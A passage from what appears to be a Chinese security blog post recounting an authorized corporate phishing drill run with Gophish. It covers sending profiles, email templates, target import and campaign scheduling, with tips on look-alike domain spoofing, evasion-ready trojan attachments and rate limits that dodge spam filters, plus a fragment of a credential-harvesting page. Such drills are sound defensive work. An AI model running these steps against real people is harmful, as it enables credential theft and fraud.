class="language-xml">        &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">        modal.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span> === modal) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;active&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;);</span></span><br><span class="language-javascript"><span class="language-xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">exit</span>;</span><br><span class="language-php">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">500000</span>);</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html&quot;</span>);</span><br><span class="language-php">    <span class="hljs-keyword">exit</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="邮件发送"><a href="#邮件发送" class="headerlink" title="邮件发送"></a>邮件发送</h2><p>进入后台后，左边的栏目即代表各个功能，分别是Dashboard 仪表板 、Campaigns 钓鱼事件 、Users &amp; Groups 用户和组 、Email Templates 邮件模板 、Landing Pages 钓鱼页面 、Sending Profiles 发件策略六大功能<br>由于实际使用中并不是按照该顺序来配置各个功能，因此下面通过实际使用顺序来详细介绍各功能的使用方法<br><img src="/images/e110e76f-d302-4b6a-bfee-7ee738d9f2df.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Sending-Profiles-发件策略"><a href="#Sending-Profiles-发件策略" class="headerlink" title="Sending Profiles 发件策略"></a>Sending Profiles 发件策略</h3><p>Sending Profiles 的主要作用是将用来发送钓鱼邮件的邮箱配置到 gophish<br>点击New Profile新建一个策略，依次来填写各个字段<br>Name：<br>Name 字段是为新建的发件策略进行命名，不会影响到钓鱼的实施，建议以发件邮箱为名字，例如如果使用 qq 邮箱来发送钓鱼邮件，则 Name 字段可以写<a href="mailto:&#120;&#120;&#120;&#x78;&#120;&#x78;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#120;&#120;&#120;&#x78;&#120;&#x78;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a><br><img src="/images/8b89f40caf4098e0af6e0ebc2c5a5872.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>Interface Type:</strong><br>Interface Type 是接口类型，默认为SMTP 类型且不可修改，因此需要发件邮箱开启 SMTP 服务<br><strong>From:</strong><br>From 是发件人，即钓鱼邮件所显示的发件人。（在实际使用中，一般需要进行近似域名伪造）这里为了容易理解，就暂时以 qq 邮箱为例，所以 From 字段可以写：test<a href="mailto:&#x78;&#120;&#120;&#120;&#120;&#x78;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#x78;&#120;&#120;&#120;&#120;&#x78;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p><img src="/images/14659717ed10bb080c0dd3751a5233a9.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>Username:</strong><br>Username 是 smtp 服务认证的用户名，如果是 qq 邮箱，Username 则是自己的 qq 邮箱号<a href="mailto:&#120;&#120;&#x78;&#120;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">&#120;&#120;&#x78;&#120;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;</a><br><strong>Password:</strong><br>Password 是 smtp 服务认证的密码，例如 qq 邮箱，需要在登录 qq 邮箱后，点击 设置 - 账户 - 开启 SMPT 服务 生成授权码，Password 的值则可以填收到的授权码</p>
+<p>（可选）Email Headers:<br>Email Headers 是自定义邮件头字段，例如邮件头的X-Mailer字段，若不修改此字段的值，通过 gophish 发出的邮件，其邮件头的 X-Mailer 的值默认为 gophish<br><img src="/images/3b7ad5c5c03df5ae1d2ec4cc60db9b09.png" srcset="/img/loading.gif" lazyload><br>设置好以上字段，可以点击Send Test Email来发送测试邮件，以检测 smtp 服务器是否认证通过<br><img src="/images/7e30eda66be1e0d03d16b2feb99aa74e.png" srcset="/img/loading.gif" lazyload><br>成功收到测试邮件：<br><img src="/images/eb0881bf-fc5c-4d1a-877d-cd59642c93c8.png" srcset="/img/loading.gif" lazyload><br>至此，发件邮箱的配置已经完成。当然，在实际钓鱼中，不可能使用自己的 qq 邮箱去发送钓鱼邮件。一是暴露自身身份，且邮件真实性低，二是 qq 邮箱这类第三方邮箱对每个用户每日发件数存在限制。<br>因此，如果需要大批量去发送钓鱼邮件，最好的方式是使用自己的服务器，申请近似域名，搭建邮件服务器来发件</p>
+<h3 id="Email-Templates-钓鱼邮件模板"><a href="#Email-Templates-钓鱼邮件模板" class="headerlink" title="Email Templates 钓鱼邮件模板"></a>Email Templates 钓鱼邮件模板</h3><p>完成了邮箱配置之后，就可以使用 gophish 发送邮件了。所以，接下来需要去编写钓鱼邮件的内容<br>点击New Template新建钓鱼邮件模板，依次介绍填写各个字段<br><strong>Name:</strong><br>同样的，这个字段是对当前新建的钓鱼邮件模板进行命名。可以简单的命名为：邮件模板 1<br><img src="/images/4c7fe845db8f6b398c29c2f7bb103b8f.png" srcset="/img/loading.gif" lazyload><br><strong>Import Email:</strong><br>gophish 为编辑邮件内容提供了两种方式，第一种就是Import Email</p>
+<p>用户可以先在自己的邮箱系统中设计好钓鱼邮件，然后发送给自己或其他伙伴，收到设计好的邮件后，打开并选择导出为 eml 文件或者显示邮件原文，然后将内容复制到 gophish 的 Import Email中，即可将设计好的钓鱼邮件导入</p>
+<p><img src="/images/c0622b8e6c30d9c45441361404f89b8b.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要注意，在点击Import之前需要勾选上Change Links to Point to Landing Page，该功能实现了当创建钓鱼事件后，会将邮件中的超链接自动转变为钓鱼网站的 URL<br><strong>Subject:</strong><br>Subject 是邮件的主题，通常为了提高邮件的真实性，需要自己去编造一个吸引人的主题。这里简单填写成“第一次钓鱼测试”<br><img src="/images/9dd1f2d56eba033d0696eb65318798b2.png" srcset="/img/loading.gif" lazyload><br><strong>内容编辑框：</strong><br>内容编辑框是编写邮件内容的第二种模式，内容编辑框提供了Text和HTML两种模式来编写邮件内容，使用方式与正常的编辑器无异。<br>其中 HTML 模式下的预览功能比较常用到，在编辑好内容后，点击预览，就可以清晰看到邮件呈现的具体内容以及格式<br><img src="/images/91cac3da28e053cdaad42057593d7cae.png" srcset="/img/loading.gif" lazyload><br><strong>Add Tracking Image:</strong><br>Add Tracking Image 是在钓鱼邮件末添加一个跟踪图像，用来跟踪受害用户是否打开了收到的钓鱼邮件。默认情况下是勾选的，如果不勾选就无法跟踪到受害用户是否打开了钓鱼邮件<br>（注：跟踪受害用户是否点击钓鱼链接以及捕捉提交数据不受其影响）<br><strong>Add Files:</strong><br>Add Files 是在发送的邮件中添加附件，一是可以添加相关文件提高邮件真实性，二是可以配合免杀木马诱导受害用户下载并打开</p>
+<p>当填写完以上字段后，点击Save Template，就能保存当前编辑好的钓鱼邮件模板</p>
+<h3 id="Users-amp-Groups-用户和组"><a href="#Users-amp-Groups-用户和组" class="headerlink" title="Users &amp; Groups 用户和组"></a>Users &amp; Groups 用户和组</h3><p>当完成上面三个功能的内容编辑，钓鱼准备工作就已经完成了 80%，Users &amp; Groups 的作用是将钓鱼的目标邮箱导入 gophish 中准备发送<br>点击New Group新建一个钓鱼的目标用户组<br><strong>Name:</strong><br>Name 是为当前新建的用户组命名，这里简单命名为目标 1 组</p>
+<p><img src="/images/35a10a02d84f53e14d7dcfc4122ddcef.png" srcset="/img/loading.gif" lazyload><br><strong>Bulk Import Users:</strong><br>Bulk Import Users 是批量导入用户邮箱，它通过上传符合特定模板的CSV 文件来批量导入目标用户邮箱<br>点击旁边灰色字体的Download CSV Template可以下载特定的 CSV 模板文件。其中，模板文件的Email是必填项，其余的Frist Name 、Last Name、Position可选填<br><img src="/images/128404802efd464f7f194a8bb573e3b7.png" srcset="/img/loading.gif" lazyload><br><strong>Add:</strong><br>除了批量导入目标用户的邮箱，gophish 也提供了单个邮箱的导入方法，这对于开始钓鱼前，钓鱼组内部测试十分方便，不需要繁琐的文件上传，直接填写Email即可，同样其余的Frist Name 、Last Name、Position可选填</p>
+<p><img src="/images/96536ea072589880b3322895f526c086.png" srcset="/img/loading.gif" lazyload><br>编辑好目标用户的邮箱后，点击Save Changes即可保存编辑好的目标邮箱保存在 gophish 中</p>
+<h3 id="Campaigns-钓鱼事件"><a href="#Campaigns-钓鱼事件" class="headerlink" title="Campaigns 钓鱼事件"></a>Campaigns 钓鱼事件</h3><p>ampaigns 的作用是将上述四个功能Sending Profiles 、Email Templates 、Landing Pages 、Users &amp; Groups联系起来，并创建钓鱼事件<br><strong>在 Campaigns 中，可以新建钓鱼事件，并选择编辑好的钓鱼邮件模板，钓鱼页面，通过配置好的发件邮箱，将钓鱼邮件发送给目标用户组内的所有用户</strong></p>
+<p>点击New Campaign新建一个钓鱼事件<br><strong>Name:</strong><br>Name 是为新建的钓鱼事件进行命名，这里简单命名为第一次钓鱼<br><img src="/images/aaafbe25342518c19a867374dc8dd115.png" srcset="/img/loading.gif" lazyload><br><strong>Email Template:</strong><br>Email Template 即钓鱼邮件模板，这里选择刚刚上面编辑好的钓鱼邮件模板邮件模板 1<br><img src="/images/f8e171f0c45a7fc56a40c6dc3a4388ba.png" srcset="/img/loading.gif" lazyload><br><strong>Landing Page:</strong><br>Landing Page 即钓鱼页面，这里选择刚刚上面编辑好的名为钓鱼页面 1的 XX 大学邮箱登录页面的钓鱼页面(这里我没有选，因为是在另一个服务器上搭建的web服务，gophish只用来发邮箱)</p>
+<p><img src="/images/e49f9ab6fac3d7f86af1a31240173538.png" srcset="/img/loading.gif" lazyload></p>
+<p>（重点）URL:<br>URL 是用来替换选定钓鱼邮件模板中超链接的值，该值指向部署了选定钓鱼页面的 url 网址（这里比较绕，下面具体解释一下，看完解释再来理解这句话）</p>
+<p>简单来说，这里的 URL 需要填写当前运行 gophish 脚本主机的 ip。<br>因为启动 gophish 后，gophish 默认监听了3333和80端口，其中3333端口是后台管理系统，而80端口就是用来部署钓鱼页面的。<br>当 URL 填写了http:&#x2F;&#x2F; 主机 IP&#x2F;，并成功创建了当前的钓鱼事件后。gophish 会在主机的80端口部署当前钓鱼事件所选定的钓鱼页面，并在发送的钓鱼邮件里，将其中所有的超链接都替换成部署在80端口的钓鱼页面的 url</p>
+<p>所以，这里的 URL 填写我本地当前运行 gophish 主机的 IP 对应的 url，即<a target="_blank" rel="noopener" href="http://192.168.141.1/">http://192.168.141.1/</a><br><img src="/images/10e3493ba5daebe5644ccb71f8f35eb6.png" srcset="/img/loading.gif" lazyload><br>另外，需要保证的是该 URL 对于目标用户组的网络环境是可达的。例如填写内网 IP，则该钓鱼事件仅能够被内网目标用户所参与，而外网目标用户网络不可达。如果部署了 gophish 的是公网服务器，URL 填写公网 IP或域名，则需要保证目标用户的内网环境能够访问该公网服务器的 IP（有些企业的内网环境会设定防火墙策略，限制内网用户能够访问的公网 IP）<br><strong>Launch Date:</strong><br>Launch Date 即钓鱼事件的实施日期，通常如果仅发送少量的邮箱，该项不需要修改。如果需要发送大量的邮箱，则配合旁边的Send Emails By效果更佳<br><img src="/images/199846fe8119a4db00ce065ad7984805.png" srcset="/img/loading.gif" lazyload><br><strong>（可选）Send Emails By:</strong><br>Send Emails By 配合Launch Date使用，可以理解为当前钓鱼事件下所有钓鱼邮件发送完成的时间。Launch Date作为起始发件时间，Send Emails By 作为完成发件时间，而它们之间的时间将被所有邮件以分钟为单位平分。</p>
+<p>例如，Launch Date的值为2020.07.22，09:00，Send Emails By的值为2020.07.22，09:04，该钓鱼事件需要发送50 封钓鱼邮件。<br>那么经过以上设定，从 9:00 到 9:04 共有 5 个发件点，这 5 个发件点被 50 封邮件平分，即每个发件点将发送 10 封，也就是每分钟仅发送 10 封。</p>
+<p>这样的好处在于，当需要发送大量的钓鱼邮件，而发件邮箱服务器并未限制每分钟的发件数，那么通过该设定可以限制钓鱼邮件不受约束的发出，从而防止因短时间大量邮件抵达目标邮箱而导致的垃圾邮件检测，甚至发件邮箱服务器 IP 被目标邮箱服务器封禁<br><strong>Sending Profile:</strong><br>Sending Profile 即发件策略，这里选择刚刚编辑好的名为<a href="mailto:&#88;&#x58;&#88;&#x58;&#x58;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#88;&#x58;&#88;&#x58;&#x58;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;</a>的发件策略<br><img src="/images/f8d40c0ef386eaddec620ce01540986f.png" srcset="/img/loading.gif" lazyload><br><strong>Groups:</strong><br>Groups 即接收钓鱼邮件的目标用户组，这里选择刚刚编辑好的名为目标 1 组的目标用户组<br><img src="/images/88dfa1208c820576abe8e24032aacad7.png" srcset="/img/loading.gif" lazyload><br>填写完以上字段，点击Launch Campaign后将会创建本次钓鱼事件（注意：如果未修改Launch Date，则默认在创建钓鱼事件后就立即开始发送钓鱼邮件）<br><img src="/images/3adc61aa35f966d5b5bd7d2beb7399b1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Dashboard-仪表板"><a href="#Dashboard-仪表板" class="headerlink" title="Dashboard 仪表板"></a>Dashboard 仪表板</h3><p>当创建了钓鱼事件后，Dashboard 会自动开始统计数据。统计的数据项包括邮件发送成功的数量及比率，邮件被打开的数量及比率，钓鱼链接被点击的数量及比率，账密数据被提交的数量和比率，以及收到电子邮件报告的数量和比率。另外，还有时间轴记录了每个行为发生的时间点<br><img src="/images/5eb2aa864427e45fa765a24ffa8763e4.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要注意的是，Dashboard 统计的是所有钓鱼事件的数据，而非单个钓鱼事件的数据，如果仅需要查看单个钓鱼事件的统计数据，可以在Campaigns中找到该钓鱼事件，点击View Results按钮查看<br><img src="/images/04451582dc8a598cd263daca01ae5a77.png" srcset="/img/loading.gif" lazyload><br>Results for 第一次钓鱼<br><img src="/images/03c9cc03a75541bb0599d4366f68deef.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此，一次在 gophish 发起的钓鱼事件所需实施步骤就已经全部完成</p>
+<h2 id="钓鱼效果与总结"><a href="#钓鱼效果与总结" class="headerlink" title="钓鱼效果与总结"></a>钓鱼效果与总结</h2><p>因为时间有些远了，有些图找不出来了，我们采用的是gophish伪造邮件+自搭web服务器进行钓鱼，并非全部采用gophish，所以较一般步骤稍有区别<br><img src="/images/20251021013357.jpg" srcset="/img/loading.gif" lazyload><br>仪表盘如上，集团内一共发了491份，后面没有记录就是因为没有全部采用以上步骤<br>当然呢，钓鱼结果就不展示了，令我吃惊的是，前面那么简单的OA web页面都能骗到不少人，统计了一下，有49个人输入了自己在集团内的账号密码，哈哈，这个结果对我来说属实有些意外，然而也少了一些乐趣，如果是客户不打回前面的页面，那么此次钓鱼演练一定会骗到更多的人吧<br><img src="/images/b829afad15cf88dfdbdb5c799f683277.png" srcset="/img/loading.gif" lazyload><br>这个是钓鱼邮件，我们以网址转换为二维码扫描的形式进入，只能说稍降低点防范吧，然后还要购买一个域名，要与客户的域名相似，伪造一下，比如<code>www.baidu.com</code> 改为 <code>www.ba1du.com</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>记一次使用gophish开展的钓鱼演练</div>
+      <div>http://example.com/2025/10/21/记一次使用gophish开展的钓鱼演练/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/05/APISandbox_4ASystem/" title="APISandbox_4Asystem">
+                        <span class="hidden-mobile">APISandbox_4Asystem</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
